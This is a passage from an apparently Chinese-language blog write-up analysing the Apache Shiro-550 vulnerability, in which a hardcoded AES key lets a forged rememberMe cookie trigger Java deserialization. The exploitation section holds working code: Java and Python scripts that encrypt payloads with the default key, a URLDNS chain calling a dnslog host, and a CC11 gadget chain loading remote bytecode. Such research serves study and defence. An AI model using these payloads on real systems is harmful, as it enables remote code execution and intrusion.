plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);<br></code></pre></td></tr></table></figure><p>最后发现这个传入的key值其实就是我们一开始找Cookie的时候找到的那个类似于硬编码的内容<br>也就是说，Shiro进行Cookie加密的AES算法的密钥就是一个写在代码中的常量，因此我们也可以通过该密钥进行加密构造内容；</p><p>至此，Shiro的decrypt过程已经解析完毕！</p><h3 id="2-3-2-deserialize反序列化"><a href="#2-3-2-deserialize反序列化" class="headerlink" title="2.3.2 deserialize反序列化"></a>2.3.2 deserialize反序列化</h3><p>从之前的<code>convertBytesToPrincipals()</code>方法进入<code>deserialize()</code>方法中</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409300026034.png" alt="img"></p><p>可以发现在<code>deserialize()</code>中的<code>deserialize</code>方法是一个接口，我们继续跟进<code>Serializer.java</code>中查看相应的实现类有哪些？</p><p>通过鼠标指向<code>deserialize</code>接口，通过快捷键<code>Ctrl+alt+b</code>查看所有的实现类</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500143.png" alt="img"></p><p>可以发现存在两个实现类，此时我们需要判断前面的函数<code>getSerializer()</code>获取到的序列化器是哪个类型？</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409300036363.png" alt="img"></p><p>通过跟踪该方法可以知道<code>getSerializer()</code>返回的是一个<code>DefaultSerializer</code>序列化器，在该序列化器中的<code>deserialize()</code>的实现细节如下：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459005.png" alt="img"></p><p>将输入的信息通过调用<code>readObject()</code>反序列化，这里可以作为很好的入口类。</p><p>至此，Shiro的反序列化过程也分析清楚啦。</p><h2 id="2-4-加密过程"><a href="#2-4-加密过程" class="headerlink" title="2.4 加密过程"></a>2.4 加密过程</h2><p>在分析完毕Cookie的解密和反序列化过程后，我们需要知道Cookie是如何产生的，因此需要进行加密过程的分析。</p><p>首先，定位产生Cookie的位置，必定是在成功登录后才会产生Cookie，所以我们查看相关的方法，最终定位到<code>AbstractRememberMeManager#onSuccessfulLogin()</code>上；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301231515.png" alt="img"></p><p>这个方法会先忘记认证，即删除前面的认证信息，然后再判断此次成功登录是否勾选<code>RememberMe</code>，从而判断是否调用<code>rememberIdentity(subject, token, info)</code>函数，根据该方法的具体实现；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301237296.png" alt="img"></p><p>一步步深入跟进可以发现加密过程与解密过程其实基本上是一致的，进一步进行动态调试查看一下在<code>rememberIdentity()</code>中的principals变量的值是什么内容</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459981.png" alt="img"></p><p>通过动态调用可以知道，principals中只存储来用户名，但是传入的认证信息<code>AuthenticationInfo</code>却保存了用户名和密码；<br>进一步跟进到<code>convertPrincipalsToBytes()</code>函数<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459714.png" alt="img"></p><p>可以知道这里其实做了两件事，一是将传入的principals进行序列化；二是将序列化后的信息进行加密；传入的principals即是登录的用户名信息；<br>这里的序列化的方式和之前分析反序列化的时候是一样的，通过<code>getSerializer()</code>获取序列化器进行序列化；详细的序列化实现方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">public byte[] serialize(T o) throws SerializationException &#123;<br>    if (o == null) &#123;<br>        String msg = &quot;argument cannot be null.&quot;;<br>        throw new IllegalArgumentException(msg);<br>    &#125;<br>    ByteArrayOutputStream baos = new ByteArrayOutputStream();<br>    BufferedOutputStream bos = new BufferedOutputStream(baos);<br><br>    try &#123;<br>        ObjectOutputStream oos = new ObjectOutputStream(bos);<br>        oos.writeObject(o);<br>        oos.close();<br>        return baos.toByteArray();<br>    &#125; catch (IOException e) &#123;<br>        String msg = &quot;Unable to serialize object [&quot; + o + &quot;].  &quot; +<br>                &quot;In order for the DefaultSerializer to serialize this object, the [&quot; + o.getClass().getName() + &quot;] &quot; +<br>                &quot;class must implement java.io.Serializable.&quot;;<br>        throw new SerializationException(msg, e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们分析一下加密方法<code>encrypt()</code>，跟进到方法的具体实现</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301252374.png" alt="img"></p><p>可以发现这里的加密方式与加密方式也是如出一辙的，包括获取密钥key的方式。如果在解密的时候，注意一下，就会发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">public void setCipherKey(byte[] cipherKey) &#123;<br>        //Since this method should only be used in symmetric ciphers<br>        //(where the enc and dec keys are the same), set it on both:<br>        setEncryptionCipherKey(cipherKey);<br>        setDecryptionCipherKey(cipherKey);<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里同时设置了两个密钥为统一默认密钥；<br>获取加密服务的方法<code>getCipherService()</code>与解密的地方也是一致的无需进一步分析；</p><p>通过F8一步一步执行回到<code>rememberIdentity()</code>中</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459428.png" alt="img"></p><p>对<code>rememberSerializedIdentity()</code>进行F7深入查看实现</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301258941.png" alt="img"></p><p>发现该方法就是设置Cookie的方法。首先，判断是否为HTTP请求，不是则直接报错跳出；若是，则将加密后的信息在进行base64编码然后再设置为Cookie值；</p><h1 id="三、Shiro-550漏洞利用"><a href="#三、Shiro-550漏洞利用" class="headerlink" title="三、Shiro-550漏洞利用"></a>三、Shiro-550漏洞利用</h1><p>如果我们需要RCE或者反弹shell，那就需要利用到反序列化，反序列化的信息能够由我们来控制；<br>在此前的分析我们可以知道，只需将我们需要反序列化的内容经过一系列的加密后替换数据包中的RememberMe的内容，即可实现任意内容反序列化。</p><h2 id="3-1-加密自定义信息"><a href="#3-1-加密自定义信息" class="headerlink" title="3.1 加密自定义信息"></a>3.1 加密自定义信息</h2><p>说实话，这里虽然我们知道加密是通过AES进行加密的，但是其中还有有非常多的细节需要注意的，最后才能进行同样的加密；</p><p>可以通过两种方式去实现该加密，一是直接使用Java通过导入同样的类，调用同样的方法去实现相同的加密；二是分析加密原理，使用python设置同样的加密模式、填充模式、生成随机化的初始向量进行加密；</p><h3 id="3-1-1-Java实现"><a href="#3-1-1-Java实现" class="headerlink" title="3.1.1 Java实现"></a>3.1.1 Java实现</h3><p>通过Java实现相对来说比较简单，因为只需要调用相同的包即可，不需要关注加密算法的具体实现细节；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> shirodemo</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.AES_Enc.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/9/30 14:37</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AES_Enc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// data: 需要加密的数据内容</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">byte</span>[] dataBytes = data.getBytes();<br><br>        <span class="hljs-type">byte</span>[] key = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br><br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aesCipherService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">encrypt</span> <span class="hljs-operator">=</span> aesCipherService.encrypt(dataBytes, key);<br>        <span class="hljs-type">byte</span>[] encryptBytes = encrypt.getBytes();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64EncBytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.encode(encryptBytes), StandardCharsets.UTF_8);<br>        System.out.println(base64EncBytes);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-1-2-python实现"><a href="#3-1-2-python实现" class="headerlink" title="3.1.2 python实现"></a>3.1.2 python实现</h3><p>通过python实现相对来说比较复杂，我们需要到源码中查看相应的实现细节；跟入算法实现细节查看</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301518800.png" alt="img"></p><p>根据上图我们可以得出的信息有：</p><ul><li><p>填充模式：PKCS#5（可以用chatgpt查一下填充方式）</p></li><li><p>加密模式：CBC</p></li><li><p>块大小block_size：默认大小</p></li></ul><p>继续从super()深入，已经没有什么非常有价值的信息了，设置了默认密钥的大小以及一些其他信息，好像没啥用；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301523981.png" alt="img"></p><p>接下来查看一下<code>encrypt()</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301525255.png" alt="img"></p><p>分析可以知道使用了随机初始化向量(IV)，其实有这些信息就已经够了；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> uuid, base64<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aesEnc</span>(<span class="hljs-params">data</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    bs = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s : s + ((bs - <span class="hljs-built_in">len</span>(s)%bs) * <span class="hljs-built_in">chr</span>(bs - <span class="hljs-built_in">len</span>(s)%bs)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    ciphertext = base64.b64encode(iv+encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    data = get_file_data(<span class="hljs-string">&#x27;shiro-550.bin&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(aesEnc(data))<br></code></pre></td></tr></table></figure><h2 id="3-2-URLDNS链"><a href="#3-2-URLDNS链" class="headerlink" title="3.2 URLDNS链"></a>3.2 URLDNS链</h2><p>目前已经了解了漏洞利用的原理，构造Payload需要将利用链通过AES加密后在Base64编码，将Payload的值设置为 rememberMe 的 cookie 值进行发送，使Shiro对我们序列化的内容进行反序列化实现利用；</p><p>由于 URLDNS 不依赖于 Commons Collections 包，只需要 JDK 的包就行，因此我们此处用来检测漏洞的存在；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">dnsurl</span> &#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException, IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;shiro-550.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename)).readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://06c2bee4.log.dnslog.biz.&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCode.setAccessible(<span class="hljs-literal">true</span>);<br>        hashCode.set(url, <span class="hljs-number">1234</span>);    <span class="hljs-comment">// 设置url变量中的hashCode变量值为1234</span><br>        HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        hashmap.put(url, <span class="hljs-number">1</span>);<br>        hashCode.set(url, -<span class="hljs-number">1</span>);<br>        serialize(hashmap);<br>        <span class="hljs-comment">//        deserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在进行payload编写的过程中先不进行反序列化，以免产生不必要的误解，然后将生成的<code>shiro-550.bin</code>加载到之前的python加密脚本中进行加密，运行结果如下图所示；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301627442.png" alt="img"></p><p>首先登录一下shiro，然后再次访问页面就会有Cookie字段，将 AES 加密出来的编码替换包中的 RememberMe Cookie，将 JSESSIONID 删掉，因为当存在 JSESSIONID 时，会忽略 rememberMe。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301628327.png" alt="img"></p><p>发送数据包后，即可收到dns请求，意味着确实进行了反序列化执行。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500827.png" alt="img"></p><h2 id="3-3-CC11利用链攻击"><a href="#3-3-CC11利用链攻击" class="headerlink" title="3.3 CC11利用链攻击"></a>3.3 CC11利用链攻击</h2><p>一开始编写了一下的序列化进行测试，发现最后是错误的，各位也可以看看我编写的攻击链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> DeserializeChain</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.CC11Exp.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/9/30 19:05</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC11Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvilBytes(String u) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(u).openConnection().getInputStream();<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> length;<br>        <span class="hljs-keyword">while</span> ((length = inputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>            byteArrayOutputStream.write(buffer, <span class="hljs-number">0</span>, length);<br>        &#125;<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//        byte[] evilCodes = Files.readAllBytes(Paths.get(&quot;D:\\\\SecTools\\\\web\\\\DeserializeChain\\\\CC11\\\\src\\\\main\\\\java\\\\com\\\\shlin\\\\entity\\\\calc.class&quot;));</span><br>        <span class="hljs-type">byte</span>[] evilCodes = getEvilBytes(<span class="hljs-string">&quot;http://127.0.0.1:8000/calc.class&quot;</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; templatesClass = templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;evilCodes&#125;);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates, <span class="hljs-string">&quot;cc11&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(hashMap, <span class="hljs-string">&quot;key&quot;</span>);<br>        hashMap.put(tiedMapEntry, <span class="hljs-number">123</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TiedMapEntry</span>&gt; tiedMapEntryClass = tiedMapEntry.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> tiedMapEntryClass.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        map.setAccessible(<span class="hljs-literal">true</span>);<br>        map.set(tiedMapEntry, decorateMap);<br>        serialize(hashMap);<br>        deserialize(<span class="hljs-string">&quot;cc11-ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;cc11-ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename)).readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301947557.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301949792.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500612.png" alt="img"></p><p>根据图片显示的报错可以知道，shiro无法加载Transformer这个类，因此导致上述的攻击链无法生效；我们需要取消载入Transformer这个类去实现攻击链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 